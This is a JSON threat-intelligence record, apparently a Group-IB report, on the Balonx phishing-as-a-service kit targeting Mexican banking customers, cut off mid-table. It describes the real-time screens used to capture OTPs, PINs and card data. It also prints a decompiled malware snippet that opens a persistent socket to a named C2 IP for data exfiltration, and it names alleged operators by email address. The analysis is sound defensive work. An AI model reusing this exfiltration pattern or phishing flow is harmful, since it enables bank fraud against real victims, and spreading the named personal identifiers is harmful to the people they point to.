@@ -1,0 +1,770 @@
+{
+ "contacts": [
+  {
+   "account": "josemorenofs19@gmail.com",
+   "flag": "fake",
+   "service": null,
+   "type": "email"
+  },
+  {
+   "account": "ferzamorafs19@gmail.com",
+   "flag": "fake",
+   "service": null,
+   "type": "email"
+  }
+ ],
+ "countries": [
+  "MX"
+ ],
+ "createdAt": "2026-06-16T22:45:39+03:00",
+ "cveList": [],
+ "dateFirstSeen": "2025-07-24",
+ "dateLastSeen": "2026-06-16",
+ "datePublished": "2026-06-16",
+ "description": "<h1 style=\"text-align:justify;\">Executive Summary</h1><p style=\"text-align:justify;\">Group-IB has detected a Phishing-as-a-Service (PhaaS) operation directed at the Mexican financial sector, with a primary focus on banking institutions. This campaign utilizes fraudulent web pages that replicate legitimate banking portals to illicitly obtain user credentials and sensitive financial data.</p><p>&nbsp;</p><p style=\"text-align:justify;\">Investigations reveal that the threat actor maintains a sophisticated yet efficient infrastructure, which has supported these operations over an extended period. Consequently, this campaign poses a persistent risk to financial organizations and their clientele within Mexico.</p><p style=\"text-align:justify;\">&nbsp;</p><h2 style=\"text-align:justify;\">Campaign Attributions</h2><ul><li>Kit Name: Balonx Sistema.</li><li>Type: Phishing-as-a-Service (PhaaS).</li><li>Primary Target: Banking users in Mexico.</li><li>Motivation: Financial.</li><li>Targeted Companies: BBVA, Citibanamex, Banorte, Santander, HSBC, Scotiabank, Banco Azteca, BanCoppel, BanBajío, Banregio, Inbursa, Invex, Afirme, Mifel, Banjército, Banco del Bienestar, Liverpool, Plata Card, Spin by Oxxo, Falabella, American Express.</li></ul><h2 style=\"text-align:justify;\">Phishing Campaign Overview</h2><p style=\"text-align:justify;\">The PhaaS campaign pertains to an ongoing operation targeting the Bank sector of México, where we have identified that the threat actor operates with 2 mains parts.</p><p>&nbsp;</p><ol><li>We have identified the creations of domains that follow a pattern, these domains host a primary landing page showcasing all the targetable banks. Knowing the exact path, we can access the Login/Registration Panel of the PhaaS.</li></ol><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/9d0fe3a66f1b9cc0b6aa35cbfe76709c8500b07b1cee503e95d939e057e6ecc0?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:9d0fe3a66f1b9cc0b6aa35cbfe76709c8500b07b1cee503e95d939e057e6ecc0_IMAGE__\" width=\"660.8719533127361\" data-mce-src=\"__IMAGE_:9d0fe3a66f1b9cc0b6aa35cbfe76709c8500b07b1cee503e95d939e057e6ecc0_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 1.&nbsp;</strong>Landing page of Balonx Sistema PhaaS.</i></h3><p>&nbsp;</p><h3 style=\"text-align:center;\"><i><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8_IMAGE__\" width=\"627\" data-mce-src=\"__IMAGE_:24e53501d7609e381e2e8428dafbcf1352ba8361644ac19f11028c527ea38cf8_IMAGE__\" /></i></h3><h3 style=\"text-align:center;\"><i><strong>Figure 2.&nbsp;</strong>Login page for BalonxSistema. /balonx</i></h3><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_:ddabafe506112e1405f7fd894a3648589fec10cf74a3239df9b8b64e3cd5aa12_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 3.&nbsp;</strong>Registration section of the Balonx PhaaS. /balonx</i></h3><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_:f589adb1e5f53c3c6f806d77a5351cdab498cf91d99db0662280b8f3f25c6d76_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 4.&nbsp; </strong>Executive access of the Balonx PhaaS. /balonx</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">&nbsp;</p><ol start=\"2\"><li>New users may register on the platform via a Telegram Bot, which is accessible through the login section illustrated in&nbsp;hxxps://docs[.]google[.]com/document/d/1t-wSbR1NV1uRs5qXWgW69jIH9xTcRAj7dyW560nbAEY/edit?tab=t.0#heading=h.9dja7qib897p. Upon registration, the bot generates a unique&nbsp;<i><strong>id</strong></i>, which serves as the primary identifier for threat actors to access the Phishing-as-a-Service (PhaaS) capabilities.</li></ol><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/53447b32045509adcb0f73a7f15b74e603b5d7d6f9a109bf56ba5eeac45fafed?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:53447b32045509adcb0f73a7f15b74e603b5d7d6f9a109bf56ba5eeac45fafed_IMAGE__\" width=\"491\" data-mce-src=\"__IMAGE_:53447b32045509adcb0f73a7f15b74e603b5d7d6f9a109bf56ba5eeac45fafed_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 5.&nbsp;</strong>Registration ID.&nbsp;</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">Upon successful acquisition of the&nbsp;<i><strong>id</strong></i>, formal approval is required from the Administrator, who is likely the developer of the PhaaS platform.</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/46d744fdf2e1ea2e3efb5e846e3367c45cdf28c92aa425ef0aed97cf34989b2c?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:46d744fdf2e1ea2e3efb5e846e3367c45cdf28c92aa425ef0aed97cf34989b2c_IMAGE__\" width=\"470\" data-mce-src=\"__IMAGE_:46d744fdf2e1ea2e3efb5e846e3367c45cdf28c92aa425ef0aed97cf34989b2c_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 6.&nbsp;</strong>User BalonxSistema, possible owner and creator of the PhaaS.</i></h3><p style=\"text-align:justify;\">Upon successful registration and payment of the applicable subscription fee, the threat actor acquires the capability to administer and utilize the system. This platform provides a comprehensive suite of tools for the development and oversight of phishing pages and active sessions.</p><p>&nbsp;</p><p style=\"text-align:justify;\">Balonx provides two distinct subscription tiers. The first is an \"Individual User\" subscription, which permits access for up to two devices, as illustrated in&nbsp;hxxps://docs[.]google[.]com/document/d/1t-wSbR1NV1uRs5qXWgW69jIH9xTcRAj7dyW560nbAEY/edit?tab=t.0#heading=h.enbflz3lzi32<i><strong>.&nbsp;</strong></i>The second tier, designated as \"Office,\" is designed for larger organizations and supports eight executive accounts, with each allocated one session.</p><p>&nbsp;</p><p style=\"text-align:center;\"><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a_IMAGE__\" width=\"538\" data-mce-src=\"__IMAGE_:56b043d65efb2a038d8a23b48242c28c2632530fd5fe8ddb6d2c3704d4d8505a_IMAGE__\" /></p><h3 style=\"text-align:center;\"><i><strong>Figure 7.&nbsp;</strong>“Office” Plan.</i></h3><p>&nbsp;</p><p style=\"text-align:justify;\">During the investigation, we identified several notable capabilities of the PhaaS platform. Most significantly, the system operates via WebSockets, enabling real-time functionality. This facilitates immediate data exfiltration and allows cybercriminals to monitor the victim's mobile screen as they interact with it.</p><p>&nbsp;</p><h2><strong>Kit Capabilities — Attack Vectors</strong></h2><h3><strong>Real-Time Attack (Live Phishing)</strong></h3><p>The primary functionality of the toolkit involves established real-time command of the victim's interface through a WebSocket protocol (/ws), which effectively facilitates the circumvention of multi-factor authentication (MFA) mechanisms.</p><p><strong>Screens the attacker can force (SCREEN_CHANGE):</strong></p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>#</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Variable</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Screen shown to victim</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">1</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">FOLIO</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Case/claim number entry (complaint pretext)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">2</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">VALIDANDO</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Animated loading screen with progress bar</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">3</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">LOGIN</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Banking username and password</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">4</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">CODIGO</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">SMS code / MFA OTP</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">5</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">NIP</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">ATM PIN</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">6</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">TARJETA</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Card number, expiration date, CVV</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">7</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">SMS_COMPRA</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Purchase authorization code (OTP for active transaction)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">8</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">CANCELACION_RETIRO</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Cardless withdrawal code + withdrawal PIN</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">9</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">ESCANEAR_QR</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">QR scan of physical card (session hijacking)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">10</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">PROTECCION_BANCARIA</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Fake security alert inducing APK installation</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">11</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">PROTECCION_SALDO</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Captures debit and credit card balances</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">12</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">VERIFICACION_ID</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Activates camera to steal ID/Passport + Selfie (KYC bypass)</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">13</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">MENSAJE</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Free custom message</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">14</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\">CANCELACION</p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Cancellation/completion screen</td></tr></tbody></table></figure><h2>&nbsp;</h2><h2>Operational Hierarchy</h2><p>&nbsp;</p><p>SuperAdmin (balonx / brandon)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;└── Admin (affiliated operator — Individual or Office plan)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── Executive (Office plan sub-operator, max. 8)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── Victim session (real-time)</p><ul><li><strong>Executives</strong> log in with an OTP sent via Telegram to the owning Admin.</li><li>Executives can view and operate victim sessions in real time but do not have access to the full admin panel.</li><li>The&nbsp;<strong>Admin</strong> controls which banks each Executive can use (allowedBanks).</li></ul><h2>Business Model (Criminal SaaS)</h2><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Attribute</strong></p></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:center;\"><strong>Detail</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Commercial name</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Balonx Sistema.</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Model</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Weekly subscription — rented to other criminals.</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Individual Plan</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">3,000 MXN / week.</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Office Plan</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">6,000 MXN / week (with Executive hierarchy).</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Payments</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Crypto via Bitso API (automated verification) + manual receipt via Telegram.</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Discount codes</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">discount_codes table with MXN discounts applicable at registration.</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>C2 Support</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">Telegram.</td></tr><tr><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\"><strong>Estimated launch/relaunch date</strong></td><td style=\"border-color:#000000;border-width:0.5pt;padding:5pt;vertical-align:top;\">2025-10-04 (hardcoded in source code to calculate kit age).</td></tr></tbody></table></figure><h2>&nbsp;</h2><h2>APK Forensic Analysis — Bankprotet</h2><p style=\"text-align:justify;\">Through extensive research and technical analysis, Group-IB has determined that the Phishing-as-a-Service (PhaaS) platform under investigation also facilitates the distribution of Android Package (APK) malware. The download path for this application was found to be publicly accessible, and subsequent forensic evaluation yielded the following technical findings:</p><p>&nbsp;</p><p>This malicious file, served by the Balonx system, is identified as a commercial Android RAT based on&nbsp;<strong>Spyroid (Spyroid[.]net)</strong>.<br><br>&nbsp;</p><ul><li><strong>Analysis Tool:</strong> JADX (Android Decompiler).</li><li><strong>Package Name:</strong> sacred.explosion.</li><li><strong>Main Class:</strong> bxelllolzxqfmaszk1049.</li></ul><p>&nbsp;</p><p>The APK contains the following critical fields, hardcoded and obfuscated in Base64:</p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:25%;\"><col style=\"width:25%;\"><col style=\"width:25%;\"><col style=\"width:25%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Field</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Base64 Value</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Decoded Value</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>Description</strong></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>ClientHost</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">MTk2LjI1MS44NC4xMQ==</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">196[.]251[.]84[.]11</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">C2 IP Address</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>ClientPort</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Nzc3MQ==</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">7771</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">C2 Port</td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><strong>ConnectionKey</strong></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">(long hardcoded key)</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">N/A</td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\">Authentication key for the C2.</td></tr></tbody></table></figure><p>&nbsp;</p><p>Once installed, the victim's device establishes a persistent TCP connection to the C2:</p><p>&nbsp;</p><p>Socket socket3 =&nbsp;new&nbsp;Socket(InetAddress.getByName(C2_HOST), C2_PORT);</p><p>socket3.setSoTimeout(0);&nbsp;// No timeout — permanent connection</p><p>outputStream.write(data);&nbsp;// Real-time data exfiltration</p><p>&nbsp;</p><ul><li>setSoTimeout(0) ensures the connection never expires.</li><li>All captured data is sent in real-time to the C2.</li><li>The attacker maintains full and persistent control over the victim's Android device.</li></ul><p>&nbsp;</p><p style=\"text-align:center;\"><i><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9_IMAGE__\" width=\"612\" data-mce-src=\"__IMAGE_:214b7196ac256571f763e42d0818e73412d5e03c0116a7d340e24753f571b9d9_IMAGE__\" /></i></p><h3 style=\"text-align:center;\"><i><strong>Figure 8.&nbsp;</strong>Analysis of the Malicious APK.</i></h3><p>&nbsp;</p><p style=\"text-align:center;\"><i><img src=\"/api/v2/hi/threat/9451b1f419f89743a3d93decd7fe333918fe7b57/file/971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc?placeholder=__IMAGE_9451b1f419f89743a3d93decd7fe333918fe7b57:971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc_IMAGE__\" width=\"624\" data-mce-src=\"__IMAGE_:971a36f5cc716b89bb8b859e547c1ed326ecc2a43c86d4b1d76d0e9d3af94afc_IMAGE__\" /></i></p><h3 style=\"text-align:center;\"><i><strong>Figure 9.&nbsp;</strong>Reverse Shell connection of the APK.</i></h3><p>&nbsp;</p><h1 style=\"text-align:justify;\">Balonx Github Repository&nbsp;</h1><p style=\"text-align:justify;\">During our investigation, we uncovered a goldmine: the Balonx GitHub repository (<i><strong>hXXps://github[.]com/ferzamorafs19/xxxxxxxxxxxx31</strong></i>). A deep dive into its code history and metadata not only confirmed the identity of the main developer but also revealed the infrastructure used to build this entire PhaaS platform.</p><p style=\"text-align:justify;\">&nbsp;</p><h2 style=\"text-align:justify;\">The Replit Footprint: Where the Code Began</h2><p style=\"text-align:justify;\">Balonx wasn't built on a local machine and then pushed to GitHub. It was built and deployed entirely via Replit, a cloud-based development environment. This is a crucial finding, confirmed by several technical clues:</p><p>&nbsp;</p><ul><li>All commit emails (except those from Gmail) use the @users[.]noreply[.]replit[.]com domain.</li><li>Numeric prefixes in these emails match specific Replit user account IDs.</li><li>Many commit messages are Replit's automatic saves, such as \"Saved progress at the end of the loop.\"</li></ul><p>&nbsp;</p><p style=\"text-align:justify;\"><strong>The Operational Takeaway:</strong> This means Replit has direct, invaluable records, including payment methods, IP addresses, and account metadata, for at least two accounts linked directly to the operator.</p><p style=\"text-align:justify;\">&nbsp;</p><h2 style=\"text-align:justify;\">The Operators Behind the Curtain</h2><p style=\"text-align:justify;\">The commit history identifies four author signatures, which boil down to two main human operators:</p><p>&nbsp;</p><ul><li><strong>Operator A (Primary Developer):</strong> Identified via Replit username&nbsp;<strong>ferzamorafs19</strong> (ID 42753891). This operator handled the strategic, high-level structural changes like subdomain configurations, link generation logic, and session management—the brains of the operation. A security slip even exposed a real email:&nbsp;<i><strong>ferzamorafs19@gmail[.]com</strong></i>.<br><br>&nbsp;</li><li><strong>Operator B (Primary Committer):</strong> Identified as&nbsp;<strong>greelgfs</strong> (ID 40580966) with the display name \"Greto Morato.\" This operator accounts for about 89% of the 944 total commits. This massive volume suggests their role was bulk implementation, possibly using AI coding tools like Replit Ghostwriter or GitHub Copilot.</li></ul><h2 style=\"text-align:justify;\">The Temporal Fingerprint: When and Where They Work</h2><p style=\"text-align:justify;\">Analyzing the commit times reveals a clear, consistent pattern tied to a single geographical location: México.</p><p>&nbsp;</p><ul><li>The quietest period for commits (12:00–17:00 UTC) perfectly aligns with 06:00–11:00 local time in México (UTC-6).</li><li>The most active hours (00:00–11:00 UTC) correspond to México's evening through late night (18:00–05:00 local time).</li></ul><p>&nbsp;</p><p style=\"text-align:justify;\">This classic pattern, combined with the kit's Mexican targets and Spanish-language commit messages, is a textbook signature for a México-based operator. Furthermore, one commit was explicitly authored with the timezone offset&nbsp;<strong>-0600 (CST México)</strong>, providing direct, undeniable confirmation.</p><p style=\"text-align:justify;\">&nbsp;</p><h2 style=\"text-align:justify;\">Repository Timeline: The Criminal Roadmap</h2><p style=\"text-align:justify;\">The repository's timeline shows active development and focused feature rollouts:</p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:50%;\"><col style=\"width:50%;\"></colgroup><tbody><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Date</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>Event</strong></p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>2025-06-11</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">First Telegram bot integration commit.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>2025-07-03</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Two more Telegram bots added.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>2025-10-04</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Date hardcoded as the kit's \"official launch\" reference.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>2025-11-12</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">A major feature burst of 17 commits in a single day, rolling out subdomain-per-bank configuration, weekly link quotas, and the removal of the Bitly shortener.</p></td></tr><tr><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\"><strong>2025-11-19</strong></p></td><td style=\"border-color:#000000;border-width:1pt;padding:5pt;vertical-align:top;\"><p style=\"text-align:justify;\">Last commit in the log.</p></td></tr></tbody></table></figure><p>&nbsp;</p><p style=\"text-align:justify;\">Key Commit Messages (confirming features):</p><p>&nbsp;</p><ul><li>\"Add personalized Telegram notifications and a Telegram bot for link generation\"</li><li>\"Remove Bitly link shortening and related functionalities\"</li><li>\"Add ability to configure bank-specific subdomains for generating links\"</li><li>\"Update link generation to enforce weekly quotas and display remaining links\"</li></ul><p>&nbsp;</p><p style=\"text-align:justify;\">This history confirms the kit is actively maintained and continually evolving.</p><p style=\"text-align:justify;\">&nbsp;</p><h2 style=\"text-align:justify;\">Exposed Secrets: Confirmation of Identity and Infrastructure</h2><p style=\"text-align:justify;\">A secret scan, uncovered 387 findings, most critically:</p><p>&nbsp;</p><p style=\"text-align:justify;\"><strong>Exposed Telegram Bot Tokens:&nbsp;</strong>Four unique bot tokens were fully exposed. This is immediately actionable for threat intelligence teams who can use these tokens to:</p><p>&nbsp;</p><ul><li>Identify the bot's username and check if it's still active.</li><li>Reveal the webhook URL pointing to additional Balonx infrastructure.</li><li>Gather recent chat IDs of admins using the bot, potentially exposing the operators' own Telegram accounts.</li><li>Report the bots to Telegram for immediate termination.</li></ul><p>&nbsp;</p><p style=\"text-align:justify;\"><strong>JWT: Direct Identity Confirmation:&nbsp;</strong>A long-lived JWT token (expiring in 2125!) was recovered. The decoded payload explicitly names the owner:&nbsp;<strong>josemorenofs19@gmail[.]com</strong>. This definitive link ties the distributed malware bundle and the source code repository to the exact same operator identity beyond any doubt.</p><p>&nbsp;</p><p style=\"text-align:justify;\"><strong>WhatsApp Session Files: Phone Numbers and Group Chats:&nbsp;</strong>The repository contained 381 secrets related to active WhatsApp Web sessions. Critically, the filenames included Mexican phone numbers (+52) and WhatsApp group IDs (@g[.]us format). This proves the operator was actively using WhatsApp-Web automation against multiple Mexican lines. One of these numbers is almost certainly the operator's control line for managing the kit via the WhatsApp bot module.</p><p style=\"text-align:justify;\">&nbsp;</p><h2 style=\"text-align:justify;\">Identity Convergence: The Final Tally</h2><p style=\"text-align:justify;\">Multiple independent data points all converge on the same person/operation:</p><p>&nbsp;</p><figure class=\"table\" style=\"float:left;\"><table class=\"ck-table-resized\" style=\"border-style:none;\"><colgroup><col style=\"width:33.33%;\"><col style=\"width:33.33%;\"><col style=\"width:33.34%;\"></colgroup><tbody><tr><td 